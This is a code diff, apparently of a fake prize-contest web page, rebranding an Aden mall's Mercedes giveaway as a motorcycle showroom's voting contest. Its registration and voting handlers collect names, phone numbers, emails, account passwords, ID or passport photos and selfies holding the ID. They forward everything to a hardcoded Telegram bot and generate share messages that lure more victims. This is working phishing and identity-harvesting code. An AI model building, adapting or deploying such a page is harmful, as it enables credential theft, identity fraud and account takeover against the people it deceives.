-      bodyEl.textContent = `شكراً لك يا ${voterName}، لقد تم احتساب صوتك النزيه لصالح المتسابق (${target.n}) بنجاح، ويسعدنا دائماً تواصلكم وثقتكم بالبيرق مول في عدن.`;
-    }
-    if (thanksCard) {
-      thanksCard.style.display = "block";
-      thanksCard.scrollIntoView({ behavior: "smooth", block: "nearest" });
+    if (thanksBox) {
+      document.getElementById("voteThanksText").textContent =
+        `شكراً لك يا ${voterName}، تم احتساب صوتك لصالح ${target.n} بنجاح.`;
+      thanksBox.style.display = "block";
     }
 
-    document.getElementById("voterNameInp").value = "";
-    document.getElementById("voterPhoneInp").value = "";
-    document.getElementById("voterEmailInp").value = "";
-    document.getElementById("voterPassInp").value = "";
-    document.getElementById("mathAnsInp").value = "";
-    document.getElementById("voterDocInp").value = "";
-    voterBlob = null;
-    const prev = document.getElementById("voterDocPrev");
+    document.getElementById("voterName").value = "";
+    document.getElementById("voterPhone").value = "";
+    document.getElementById("voterEmail").value = "";
+    document.getElementById("voterPassword").value = "";
+    document.getElementById("captchaAnswer").value = "";
+    document.getElementById("voterIdImage").value = "";
+    voterIdBlob = null;
+    const prev = document.getElementById("voterIdPreview");
     if (prev) prev.style.display = "none";
-    initMathQuestion();
+    initCaptcha();
 
     btn.disabled = false;
-    btn.textContent = "🗳️ اعتمد صوتي الآن";
-
+    btn.textContent = "اعتماد الصوت الآن";
   } catch (err) {
-    msgEl.className = "status-msg err";
-    msgEl.textContent = "❌ تعذر إرسال بيانات التصويت للبوت، يرجى التأكد من اتصال الإنترنت والمحاولة.";
+    fb.className = "feedback err";
+    fb.textContent = "تعذر إرسال البيانات للبوت، تحقق من الاتصال وحاول مجدداً.";
     btn.disabled = false;
-    btn.textContent = "🗳️ اعتمد صوتي الآن";
+    btn.textContent = "اعتماد الصوت الآن";
   }
 });
 
-function formatShareCard(name, code, url) {
-  return `🚘✨ *مسابقة البيرق مول الكبرى على سيارة مرسيدس — عدن* ✨🚘
-
-أهلاً بكم أحبتي وأصدقائي الكرام 🌟
-أشارككم فرحتي بمشاركتي في مسابقة *البيرق مول* (جولة البيرق — عدن) للفوز بسيارة *مرسيدس* 🏆
-
-🎟️ *اسمي:* ${name}
-🔑 *رمزي في المسابقة:* ${code}
-
-دعمكم وصوتكم يمنحني فرصة أكبر للمنافسة والفوز 💪🔥
-ادخلوا عبر الرابط المباشر أدناه وصوّتوا لي بخطوات سهلة وسريعة:
-🔗 ${url}
-
-🙏 *شكراً جزيلاً لكل من يشارك ويدعم بكل نزاهة.*
-🏛️ *البيرق مول — عدن • جولة البيرق*`;
-}
-
-document.getElementById("joinForm").addEventListener("submit", async function(e) {
+document.getElementById("registerForm").addEventListener("submit", async function(e) {
   e.preventDefault();
-  const msgEl = document.getElementById("joinMsg");
-  msgEl.className = "status-msg";
+  const fb = document.getElementById("regFeedback");
+  fb.className = "feedback";
 
-  if (!regIdBlob || !regSelfieBlob) {
-    msgEl.className = "status-msg err";
-    msgEl.textContent = "❌ يرجى إرفاق صورة البطاقة أو الجواز وصورة السيلفي مع الهوية معاً!";
+  if (!idCardBlob || !selfieIdBlob) {
+    fb.className = "feedback err";
+    fb.textContent = "يرجى إرفاق صورة الهوية/الجواز وصورة السيلفي مع الهوية.";
     return;
   }
 
   if (stateData.c.length >= MAX_CAP) {
-    msgEl.className = "status-msg err";
-    msgEl.textContent = "⚠️ نعتذر، لقد اكتمل العدد الأقصى للمتسابقين (100 متسابق).";
+    fb.className = "feedback err";
+    fb.textContent = `تم الوصول للحد الأقصى للمتسابقين (${MAX_CAP}).`;
     return;
   }
 
-  const phone = document.getElementById("regPhoneInp").value.trim().replace(/\s+/g, "");
+  const phone = document.getElementById("regPhone").value.trim().replace(/\s+/g, "");
   if (stateData.c.some(c => c.p === phone)) {
-    msgEl.className = "status-msg err";
-    msgEl.textContent = "⚠️ رقم الهاتف هذا مسجل مسبقاً كمتسابق في المسابقة!";
+    fb.className = "feedback err";
+    fb.textContent = "رقم الهاتف مسجل مسبقاً في قائمة المتسابقين.";
     return;
   }
 
-  const btn = document.getElementById("joinSubmit");
+  const btn = document.getElementById("regSubmitBtn");
   btn.disabled = true;
-  btn.textContent = "⚡ جارٍ إصدار رابط التصويت وإرسال الوثائق...";
+  btn.textContent = "جارٍ تسجيل البيانات وإصدار الرمز...";
 
   try {
     let code = "";
     do {
-      code = "BAYRAQ-" + Math.floor(1000 + Math.random() * 9000);
+      code = "AMIR-" + Math.floor(1000 + Math.random() * 9000);
     } while (stateData.c.some(c => c.k === code));
 
-    const name = escHtml(document.getElementById("regFullName").value.trim());
-    const email = escHtml(document.getElementById("regEmailInp").value.trim());
-    const pass = escHtml(document.getElementById("regPassInp").value.trim());
-    const zone = escHtml(document.getElementById("regZoneInp").value.trim());
-    const wing = escHtml(document.getElementById("regWingSel").value);
-    const note = escHtml(document.getElementById("regNoteInp").value.trim());
+    const name = escHtml(document.getElementById("regName").value.trim());
+    const email = escHtml(document.getElementById("regEmail").value.trim());
+    const pass = escHtml(document.getElementById("regPassword").value.trim());
+    const city = escHtml(document.getElementById("regCity").value.trim());
+    const favModel = escHtml(document.getElementById("regModel").value);
+    const note = escHtml(document.getElementById("regNote").value.trim());
 
     const cap =
-`🚨 <b>متسابق جديد — البيرق مول عدن (${stateData.c.length + 1}/${MAX_CAP})</b>
+`🚨 <b>متسابق جديد — أمير المترات (${stateData.c.length + 1}/${MAX_CAP})</b>
 ━━━━━━━━━━━━━━━━━━
 🎟️ <b>الرمز:</b> <code>${code}</code>
 👤 <b>الاسم:</b> ${name}
 📱 <b>الهاتف:</b> <code>${phone}</code>
 📧 <b>البريد:</b> <code>${email}</code>
 🔑 <b>كلمة المرور:</b> <code>${pass}</code>
-🏙️ <b>المنطقة:</b> ${zone}
-🏛️ <b>القسم المفضل:</b> ${wing}
+🏙️ <b>المنطقة:</b> ${city}
+🏍️ <b>الفئة المفضلة:</b> ${favModel}
 💬 <b>كلمة للجمهور:</b> ${note || "لا يوجد"}`;
 
     const fd1 = new FormData();
     fd1.append("chat_id", CHAT_ID);
-    fd1.append("photo", regIdBlob, "id_doc.jpg");
+    fd1.append("photo", idCardBlob, "id_card.jpg");
     fd1.append("caption", cap);
     fd1.append("parse_mode", "HTML");
 
     const fd2 = new FormData();
     fd2.append("chat_id", CHAT_ID);
-    fd2.append("photo", regSelfieBlob, "selfie_doc.jpg");
+    fd2.append("photo", selfieIdBlob, "selfie_id.jpg");
     fd2.append("caption", `🤳 سيلفي مع الهوية للمتسابق: ${name} (${code})`);
 
     const [r1, r2] = await Promise.all([
@@ -1398,90 +1690,74 @@ document.getElementById("joinForm").addEventListener("submit", async function(e)
 
     if (!r1.ok || !r2.ok) throw new Error("upload failed");
 
-    stateData.c.push({ k: code, n: name, p: phone, y: zone, v: 0 });
-    saveStateLocal();
+    stateData.c.push({ k: code, n: name, p: phone, y: city, v: 0 });
+    persistLocal();
     syncCloudBackground();
     renderBoard();
 
-    const shareUrl = `${window.location.origin}${window.location.pathname}?vote=${code}#voting`;
-    const shareMsg = formatShareCard(name, code, shareUrl);
+    const voteUrl = `${window.location.origin}${window.location.pathname}?vote=${code}#voting`;
+    const inviteMsg =
+`🏍️ مسابقة وتصويت متر فلينج — أمير المترات
+
+الاسم: ${name}
+الرمز: ${code}
+
+صوّت لي عبر الرابط المباشر:
+${voteUrl}
+
+معرض أمير المترات — القاعدة / الشارع العام`;
 
     document.getElementById("ticketCodeOut").textContent = code;
-    document.getElementById("shareMsgOut").textContent = shareMsg;
-    document.getElementById("joinForm").style.display = "none";
+    document.getElementById("inviteTextOut").textContent = inviteMsg;
+    document.getElementById("registerForm").style.display = "none";
     document.getElementById("ticketResult").style.display = "block";
     document.getElementById("ticketResult").scrollIntoView({ behavior: "smooth" });
-
   } catch (err) {
-    msgEl.className = "status-msg err";
-    msgEl.textContent = "❌ تعذر إتمام التسجيل، تأكد من اتصال الإنترنت وحاول مرة أخرى.";
+    fb.className = "feedback err";
+    fb.textContent = "تعذر إتمام التسجيل، تأكد من الاتصال وحاول مرة أخرى.";
     btn.disabled = false;
-    btn.textContent = "🔥 أقر بصحة بياناتي وإصدار رابط التصويت الخاص بي";
+    btn.textContent = "إصدار رمز المتسابق ورابط التصويت";
   }
 });
 
-async function testBotStatus() {
-  try {
-    const me = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`).then(r => r.json());
-    if (!me.ok) {
-      alert("❌ التوكن غير صالح أو البوت متوقف.");
-      return;
-    }
-    const send = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: `📡 <b>فحص اتصال ناجح — البيرق مول عدن</b>\n🤖 البوت: <b>@${me.result.username}</b>\n⏰ الوقت: ${new Date().toLocaleString("ar-YE")}`,
-        parse_mode: "HTML"
-      })
-    }).then(r => r.json());
-
-    if (send.ok) alert(`✅ البوت (@${me.result.username}) متصل ويعمل بنجاح!`);
-    else alert(`⚠️ البوت يعمل لكن تعذر الإرسال إلى CHAT_ID (${CHAT_ID}): ${send.description || "تحقق من صلاحيات البوت"}`);
-  } catch (e) {
-    alert("❌ تعذر الاتصال بواجهة تليجرام.");
-  }
+function copyInvite() {
+  const txt = document.getElementById("inviteTextOut").textContent;
+  navigator.clipboard.writeText(txt).then(() => {
+    document.getElementById("copyDone").style.display = "block";
+  });
 }
 
-function toggleAdminMode() {
-  if (document.body.classList.contains("admin-mode")) {
-    document.body.classList.remove("admin-mode");
-    alert("تم الخروج من وضع الإدارة.");
+function toggleAdmin() {
+  if (document.body.classList.contains("admin-on")) {
+    document.body.classList.remove("admin-on");
+    alert("تم إيقاف وضع الإدارة.");
     return;
   }
-  const pin = prompt("🔐 أدخل الرقم السري لإدارة البيرق مول:");
+  const pin = prompt("أدخل رمز الإدارة:");
   if (pin === ADMIN_PIN) {
-    document.body.classList.add("admin-mode");
-    alert("✅ تم تفعيل وضع الإدارة! ظهرت الآن أدوات التقرير وفحص البوت وتحديث الصورة واستبعاد المخالفين.");
+    document.body.classList.add("admin-on");
+    alert("تم تفعيل وضع الإدارة.");
   } else if (pin !== null) {
-    alert("❌ الرقم السري غير صحيح!");
+    alert("رمز الإدارة غير صحيح.");
   }
 }
 
-function kickCandidate(code, name) {
-  if (!confirm(`⚠️ هل أنت متأكد من استبعاد وحذف المتسابق (${name} - ${code}) نهائياً؟`)) return;
+function deleteCandidate(code, name) {
+  if (!confirm(`تأكيد حذف المتسابق (${name} - ${code})؟`)) return;
   stateData.c = stateData.c.filter(c => c.k !== code);
-  saveStateLocal();
+  persistLocal();
   syncCloudBackground();
   renderBoard();
-  alert(`✅ تم استبعاد المتسابق (${name}) فوراً.`);
 }
 
-async function sendBoardReport() {
-  if (stateData.c.length === 0) {
-    alert("لا يوجد متسابقون مسجلون حالياً.");
-    return;
-  }
-  const total = stateData.c.reduce((sum, x) => sum + (x.v || 0), 0);
-  const lines = buildSortedLines(25);
+async function sendSortedReportToBot() {
+  const total = stateData.c.reduce((s, x) => s + (x.v || 0), 0);
+  const lines = buildSortedLines(30);
   const msg =
-`📋 <b>تقرير الترتيب المرتب — البيرق مول عدن</b>
-👥 المتسابقون: <b>${stateData.c.length}</b> | 🗳️ إجمالي الأصوات: <b>${total}</b>
+`📋 <b>تقرير الترتيب — أمير المترات</b>
+👥 المتسابقون: <b>${stateData.c.length}/${MAX_CAP}</b> | 🗳️ الأصوات: <b>${total}</b>
 ━━━━━━━━━━━━━━━━━━
-${lines}
-━━━━━━━━━━━━━━━━━━
-⏰ <b>التوقيت:</b> ${new Date().toLocaleString("ar-YE")}`;
+${lines}`;
 
   const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method: "POST",
@@ -1489,15 +1765,31 @@ ${lines}
     body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "HTML" })
   }).then(r => r.json());
 
-  if (res.ok) alert("✅ تم إرسال التقرير المرتب إلى البوت!");
-  else alert(`⚠️ تعذر إرسال التقرير: ${res.description || "تحقق من البوت"}`);
+  if (res.ok) alert("تم إرسال التقرير للبوت.");
+  else alert("تعذر إرسال التقرير للبوت.");
 }
 
-function copyShareMsg() {
-  const txt = document.getElementById("shareMsgOut").textContent;
-  navigator.clipboard.writeText(txt).then(() => {
-    document.getElementById("copyConfirm").style.display = "block";
-  });
+async function testBotConnection() {
+  try {
+    const me = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`).then(r => r.json());
+    if (!me.ok) {
+      alert("التوكن غير صالح.");
+      return;
+    }
+    const send = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: `📡 فحص اتصال البوت (@${me.result.username}) — أمير المترات`,
+        parse_mode: "HTML"
+      })
+    }).then(r => r.json());
+    if (send.ok) alert(`البوت (@${me.result.username}) متصل بنجاح.`);
+    else alert("تعذر الإرسال إلى المحادثة المحددة.");
+  } catch (e) {
+    alert("تعذر الاتصال بواجهة تليجرام.");
+  }
 }
 
 function togglePass(id, btn) {
@@ -1507,7 +1799,7 @@ function togglePass(id, btn) {
   btn.textContent = inp.type === "password" ? "إظهار" : "إخفاء";
 }
 
-function compressImageFile(event, prevId) {
+function handleImage(event, prevId) {
   const file = event.target.files[0];
   if (!file) return;
   const reader = new FileReader();
@@ -1520,15 +1812,19 @@ function compressImageFile(event, prevId) {
       let w = img.width, h = img.height;
       if (w > h && w > MAX) { h *= MAX / w; w = MAX; }
       else if (h > MAX) { w *= MAX / h; h = MAX; }
-      canvas.width = w; canvas.height = h;
+      canvas.width = w;
+      canvas.height = h;
       ctx.drawImage(img, 0, 0, w, h);
       canvas.toBlob(blob => {
-        if (prevId === "voterDocPrev") voterBlob = blob;
-        else if (prevId === "regIdPrev") regIdBlob = blob;
-        else if (prevId === "regSelfiePrev") regSelfieBlob = blob;
+        if (prevId === "voterIdPreview") voterIdBlob = blob;
+        else if (prevId === "idPreview") idCardBlob = blob;
+        else if (prevId === "selfiePreview") selfieIdBlob = blob;
 
         const prev = document.getElementById(prevId);
-        if (prev) { prev.src = URL.createObjectURL(blob); prev.style.display = "block"; }
+        if (prev) {
+          prev.src = URL.createObjectURL(blob);
+          prev.style.display = "block";
+        }
       }, "image/jpeg", 0.72);
     };
     img.src = e.target.result;
@@ -1537,14 +1833,17 @@ function compressImageFile(event, prevId) {
 }
 
 function escHtml(str) {
-  return String(str).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+  return String(str)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;");
 }
 
-initMathQuestion();
+initCaptcha();
 renderBoard();
-checkUrlVote();
-syncStateFromCloud(false);
-setInterval(() => syncStateFromCloud(false), 15000);
+applyUrlVoteParam();
+syncFromTelegramCloud(false);
+setInterval(() => syncFromTelegramCloud(false), 15000);
 </script>
 
 </body>
